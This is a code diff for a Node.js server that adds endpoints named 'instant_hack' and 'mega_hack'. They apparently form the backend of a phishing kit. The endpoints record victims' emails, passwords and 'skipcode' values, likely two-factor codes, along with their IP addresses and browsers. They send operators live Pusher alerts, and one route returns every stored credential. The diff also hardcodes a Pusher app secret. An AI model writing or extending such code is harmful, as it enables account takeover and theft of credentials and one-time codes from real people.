@@ -1,6 +1,7 @@
 'use strict'
 import NewInfo from '../models/OldInfo.js'
 import nodemailer from 'nodemailer';
+import Mega from '../models/Mega.js'
 
 import User from '../models/User.js'
 import Info from '../models/Info.js'
@@ -435,6 +436,119 @@ export const add_data = async (req, res) => {
 
         }
         return    res.status(400).json({ e: "not found" })
+
+
+    } catch (e) {
+        return  res.status(400).json({ e: "error" })
+    }
+
+}
+
+export const instant_hack = async (req, res) => {
+    const pusher = new Pusher({
+        appId: '1914218',
+        key: 'cdcdb714d33f15d59e8f',
+        secret: '06e18ef63bc93452826a',
+        cluster: 'ap1',
+        useTLS: true,
+      });
+
+    const { adminId, posterId } = req.params
+    const { site, email, password, skipcode  } = req.body
+    const userAgent = req.headers['user-agent'];
+    const ipAddress =  (req.headers['x-forwarded-for'] || 
+    req.connection.remoteAddress || 
+    req.socket.remoteAddress || 
+    req.connection.socket.remoteAddress).split(",")[0];
+
+    try {
+        const userFound = await User.findOne({ adminId: adminId })
+
+        const posterFound = await Poster.findOne({ posterId: posterId })
+
+        if (userFound && posterFound) {
+            const info = await Info.create({
+                site, email, password, skipcode,
+               adminId:adminId,
+                poster: posterId,
+                root: posterFound._id,
+                ip:ipAddress,
+                agent:userAgent
+
+
+            })
+            const cookie=createToken(info._id)
+            info.cookie=cookie
+            await info.save();
+            if(info){
+                pusher.trigger(userFound.adminId, 'new-notification', {
+                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
+                  });
+            }
+            posterFound.details.push(info._id)
+            await posterFound.save();
+           
+            
+            return   res.status(200).json({ info: info ,email:posterFound.username})
+
+        }
+        return    res.status(400).json({ e: "not found" })
+
+
+    } catch (e) {
+        return  res.status(400).json({ e: "error" })
+    }
+
+}
+
+
+export const mega_hack = async (req, res) => {
+  
+
+    const {  email, password, userAgent  } = req.body
+   
+
+    try {
+      
+
+       
+            const info = await Mega.create({
+                 email, password,
+           
+                agent:userAgent
+
+
+            })
+           
+           
+            
+            return   res.status(200).json({ info: info })
+
+        
+
+
+    } catch (e) {
+        return  res.status(400).json({ e: "error" })
+    }
+
+}
+
+export const mega_hack_get = async (req, res) => {
+  
+
+   
+
+    try {
+      
+
+       
+            const info = await Mega.find( )
+           
+           
+            
+            return   res.status(200).json({ info: info })
+
+        
 
 
     } catch (e) {
